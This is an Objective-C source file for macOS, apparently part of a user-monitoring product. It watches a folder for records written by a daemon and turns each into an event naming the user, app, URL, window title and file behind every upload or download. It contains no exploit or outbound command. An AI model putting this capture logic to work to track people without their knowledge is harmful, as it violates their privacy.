//
//  InternetFileUploadDownloadCapture.m
//  InternetFileTransferManager
//
//  Created by ophat on 9/16/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "InternetFileUploadDownloadCapture.h"

#import "SystemUtilsImpl.h"
#import "DateTimeFormat.h"
#import "FxFileTransferEvent.h"
#import "MessagePortIPCSender.h"

@implementation InternetFileUploadDownloadCapture
@synthesize mWatchlist;
@synthesize mStream , mCurrentRunloopRef,watchPath;
@synthesize mDelegate, mSelector ,mThread;

const int downloadDirection = 0;
const int uploadDirection   = 1;

InternetFileUploadDownloadCapture *_InternetFileUploadDownloadCapture;

#pragma mark #Start/Stop

-(id)initWithWatchPath:(NSString *)aPath{
    self = [super init];
    if (self) {
        _InternetFileUploadDownloadCapture = self;
        mWatchlist = [[NSMutableArray alloc]init];
        self.watchPath = aPath;
        [mWatchlist addObject:watchPath];
    }
    return self;
}

-(void)startCapture {
    DLog(@"startCapture");
    [self sendToDaemonWithToStop];
    [self sendToDaemonWithToStartCapture];
    [self watchThisPath:mWatchlist];
}

-(void)stopCapture {
    DLog(@"stopCapture");
    [self sendToDaemonWithToStop];
    if (mStream != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
}

-(void) watchThisPath:(NSArray *) afileInputPath {
    FSEventStreamContext context;
    context.info = (__bridge void *)(self);
    context.version = 0;
    context.retain = NULL;
    context.release = NULL;
    context.copyDescription = NULL;
    
    if (mStream != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
    
    if([afileInputPath count] > 0 ){
        mCurrentRunloopRef = CFRunLoopGetCurrent();
        mStream =   FSEventStreamCreate(NULL,
                                        &fileUploadDownloadCreateEvent,
                                        &context,
                                        (__bridge CFArrayRef) afileInputPath,
                                        kFSEventStreamEventIdSinceNow,
                                        1.5,
                                        kFSEventStreamCreateFlagWatchRoot  |
                                        kFSEventStreamCreateFlagUseCFTypes |
                                        kFSEventStreamCreateFlagFileEvents
                                        );
        
        FSEventStreamScheduleWithRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStart(mStream);
    }
}

static void fileUploadDownloadCreateEvent(ConstFSEventStreamRef streamRef,
                                          void* callBackInfo,
                                          size_t numEvents,
                                          void* eventPaths,
                                          const FSEventStreamEventFlags eventFlags[],
                                          const FSEventStreamEventId eventIds[]) {
    NSArray * temp_path = (__bridge NSArray*)eventPaths;
    NSMutableArray * temp_flag = [NSMutableArray array];
    for (int i=0; i<[temp_path count]; i++) {
        [temp_flag addObject:[NSString stringWithFormat:@"%d",(unsigned int)eventFlags[i]]];
    }
    
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    NSMutableDictionary * info = [[[NSMutableDictionary alloc]init] autorelease];
    [info setObject:temp_flag forKey:@"flag"];
    [info setObject:temp_path forKey:@"path"];
    [NSThread detachNewThreadSelector:@selector(processOnNSThread:) toTarget:_InternetFileUploadDownloadCapture withObject:info];
    [pool drain];
    
}
-(void)processOnNSThread:(NSMutableDictionary *)aDict{
    NSArray * paths = [[NSArray alloc]initWithArray:[aDict objectForKey:@"path"]];
    DLog(@"##### paths %@",paths);
    NSMutableArray * flag = [[NSMutableArray alloc]initWithArray:[aDict objectForKey:@"flag"]];
    
    for (int i=0; i< [paths count] ; i++ ){
        NSString * filePath = [NSString stringWithFormat:@"%@",[paths objectAtIndex:i]];
        if ([filePath rangeOfString:@"."].location != NSNotFound) {
            if ([filePath rangeOfString:@".dat"].location == NSNotFound) {
                if ([[flag objectAtIndex:i] intValue] & kFSEventStreamEventFlagItemCreated || [[flag objectAtIndex:i] intValue] & kFSEventStreamEventFlagItemRenamed) {
                    [self receiveFileUploadDownloadWithPath:filePath];
                }
            }
        }
    }
    
    [paths release];
    [flag release];
}
-(void)receiveFileUploadDownloadWithPath:(NSString *)aPath{
    if ([mDelegate respondsToSelector:mSelector] ){
        NSString * info = [[NSString alloc]initWithContentsOfFile:aPath encoding:NSUTF8StringEncoding error:nil];
        if (info) {
            NSArray * spliter = [info componentsSeparatedByString:@"|"];
            int direction         = [[spliter objectAtIndex:0] intValue];
            NSString * cUser      = [spliter objectAtIndex:1];
            NSString * appID      = [spliter objectAtIndex:2];
            NSString * appName    = [spliter objectAtIndex:3];
            NSString * url        = [spliter objectAtIndex:4];
            NSString * title      = [spliter objectAtIndex:5];
            NSString * filename   = [spliter objectAtIndex:6];
            NSString * pathTofile = [spliter objectAtIndex:7];
            int fileSize         = [[spliter objectAtIndex:8] intValue];
            
            DLog(@"============ receiveFileUploadDownloadWithPath =============");
            DLog(@"Direction :%d",direction);
            DLog(@"CurrentUser :%@",cUser);
            DLog(@"aAppID :%@",appID);
            DLog(@"App :%@",appName);
            DLog(@"URL :%@",url);
            DLog(@"Title :%@",title);
            DLog(@"Path :%@",pathTofile);
            DLog(@"FileName :%@",filename);
            DLog(@"FileSize :%d",fileSize);
            DLog(@"=========================");
            
            FxFileTransferEvent *fileTransferEvent = [[FxFileTransferEvent alloc] init];
            [fileTransferEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [fileTransferEvent setMUserLogonName:cUser];
            [fileTransferEvent setMApplicationID:appID];
            [fileTransferEvent setMApplicationName:appName];
            [fileTransferEvent setMTitle:title];
            
            if ([url rangeOfString:@"http"].location !=NSNotFound || [url rangeOfString:@"https"].location !=NSNotFound ) {
                [fileTransferEvent setMTransferType:kFileTransferTypeHTTP_HTTPS];
            }else{
                [fileTransferEvent setMTransferType:kFileTransferTypeUnknown];
            }
            
            if (direction == uploadDirection) {
                [fileTransferEvent setMDirection:kEventDirectionOut];
                [fileTransferEvent setMSourcePath:[NSString stringWithFormat:@"%@/%@",pathTofile,filename]];
                [fileTransferEvent setMDestinationPath:url];
            }else if (direction == downloadDirection) {
                [fileTransferEvent setMDirection:kEventDirectionIn];
                [fileTransferEvent setMSourcePath:url];
                [fileTransferEvent setMDestinationPath:[NSString stringWithFormat:@"%@/%@",pathTofile,filename]];
            }
            
            [fileTransferEvent setMFileName:filename];
            [fileTransferEvent setMFileSize:fileSize];
            [mDelegate performSelector:mSelector onThread:mThread withObject:fileTransferEvent waitUntilDone:NO];
            [fileTransferEvent release];
        }
    }
    [self sendToDaemonWithToDeleteFileWithPath:aPath];
}


#pragma mark #### sendToDaemon

-(void)sendToDaemonWithToDeleteFileWithPath:(NSString *)aPath{
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"delete" forKey:@"type"];
    [myCommand setObject:aPath forKey:@"path"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
    
}

-(void)sendToDaemonWithToStartCapture{
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"fileuploaddownload_start"forKey:@"type"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
}

-(void)sendToDaemonWithToStop{
    
    DLog(@"::==> sendToDaemonWithToStop");
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"fileuploaddownload_stop"forKey:@"type"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
}

#pragma mark #Destroy

- (void)dealloc{
    _InternetFileUploadDownloadCapture = nil;
    mStream = nil;
    mCurrentRunloopRef = nil;
    [mThread release];
    [super dealloc];
}
@end
